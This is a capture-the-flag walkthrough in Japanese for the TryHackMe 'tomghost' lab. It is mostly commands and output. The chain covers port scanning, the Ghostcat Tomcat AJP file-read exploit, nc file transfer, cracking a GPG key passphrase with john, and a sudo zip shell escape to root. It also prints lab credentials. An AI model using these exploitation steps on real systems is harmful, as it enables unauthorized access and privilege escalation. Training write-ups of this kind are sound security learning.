# tomghost CTF

https://tryhackme.com/r/room/tomghost

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.131.124
root@ip-10-10-182-37:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-12 23:26 GMT
Nmap scan report for 10.10.131.124
Host is up (0.00025s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy
MAC Address: 02:7E:CB:ED:64:95 (Unknown)

root@ip-10-10-182-37:~# sudo nmap -sV -p22,53,8009,8080 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-12 23:26 GMT
Nmap scan report for 10.10.131.124
Host is up (0.00019s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
MAC Address: 02:7E:CB:ED:64:95 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-182-37:~# gobuster dir -u http://$TARGET:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.131.124:8080
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/http%3A%2F%2Fwww     (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 804]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 804]
/http%3A%2F%2Fblog    (Status: 400) [Size: 804]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 804]
/External%5CX-News    (Status: 400) [Size: 795]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 804]
/http%3A%2F%2Fradar   (Status: 400) [Size: 804]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 804]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 804]
/http%3A%2F%2Fswik    (Status: 400) [Size: 804]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

## CVE-2020-1938

https://www.ipa.go.jp/archive/security/security-alert/2019/alert20200225.html

```shell
msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit
[*] Running module against 10.10.131.124
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

[+] 10.10.131.124:8009 - File contents save to: /home/kali/.msf4/loot/20250112185622_default_10.10.131.124_WEBINFweb.xml_084149.txt
[*] Auxiliary module execution completed
```

ユーザー名とパスワードを取得した。  
skyfuck:8730281lkjlkjdqlksalks

## skyfuck
```shell
└─$ ssh skyfuck@10.10.131.124    
The authenticity of host '10.10.131.124 (10.10.131.124)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.131.124' (ED25519) to the list of known hosts.
skyfuck@10.10.131.124's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ 
```

```shell
skyfuck@ubuntu:~$ ls -al
total 40
drwxr-xr-x 3 skyfuck skyfuck 4096 Jan 12 15:58 .
drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..
-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4096 Jan 12 15:58 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```
PGPファイルとプライベートキーがある。  
ダウンロードしてクラックしたい。

### ファイルダウンロード

```shell
# サーバー側
skyfuck@ubuntu:~$ nc -nlvp 12345 < tryhackme.asc
Listening on [0.0.0.0] (family 0, port 12345)
Connection from [10.2.22.182] port 12345 [tcp/*] accepted (family 2, sport 41616)

skyfuck@ubuntu:~$ nc -nlvp 12345 < credential.pgp
Listening on [0.0.0.0] (family 0, port 12345)
Connection from [10.2.22.182] port 12345 [tcp/*] accepted (family 2, sport 38996)

# kali側
$ nc 10.10.131.124 12345 > tryhackme.asc
$ nc 10.10.131.124 12345 > credential.pgp

$ ls -al
total 100
drwxrwxr-x  2 kali kali 4096 Jan 12 19:14 .
drwx------ 26 kali kali 4096 Jan 12 19:04 ..
-rw-rw-r--  1 kali kali  394 Jan 12 19:14 credential.pgp
-rw-rw-r--  1 kali kali 5144 Jan 12 19:12 tryhackme.asc
```

## PGP

### パスワードクラック
```shell
$ gpg2john ./tryhackme.asc > hash

$ cat hash                                               
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::./tryhackme.asc

$ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2025-01-12 19:22) 4.347g/s 4660p/s 4660c/s 4660C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

プライベートキーが割れた。  
alexandru

### キーインポート、復号
```shell
gpg --import ./tryhackme.asc   
gpg: keybox '/home/kali/.gnupg/pubring.kbx' created
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

$ gpg --decrypt ./credential.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

新しい認証情報が出てきた。  
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

## merlin
```shell
$ ssh merlin@10.10.131.124
merlin@10.10.131.124's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ ls -al
total 36
drwxr-xr-x 4 merlin merlin 4096 Mar 10  2020 .
drwxr-xr-x 4 root   root   4096 Mar 10  2020 ..
-rw------- 1 root   root   2090 Mar 10  2020 .bash_history
-rw-r--r-- 1 merlin merlin  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Mar 10  2020 .bashrc
drwx------ 2 merlin merlin 4096 Mar 10  2020 .cache
drwxrwxr-x 2 merlin merlin 4096 Mar 10  2020 .nano
-rw-r--r-- 1 merlin merlin  655 Mar 10  2020 .profile
-rw-r--r-- 1 merlin merlin    0 Mar 10  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 merlin merlin   26 Mar 10  2020 user.txt

merlin@ubuntu:~$ cat ./user.txt
THM{Ghost...}
```

userフラグゲット。

## 権限昇格

```shell
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

zip に sudo が付いている。

```shell
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root

# ls /root
root.txt  ufw
# cat /root/root.txt
THM{Z1P_1S...}
```

rootフラグゲット！

## 振り返り
- CVE-2020-1938 は searchsploit で見つけることはできず、「tomcat 9.0.30」でGoogle検索する必要があった。
- metasploit では、ghostcat のキーワードで search した後、show info で CVE-2020-1938 と一致していることを確認した。
- GPG は 2回目だったので単純作業。
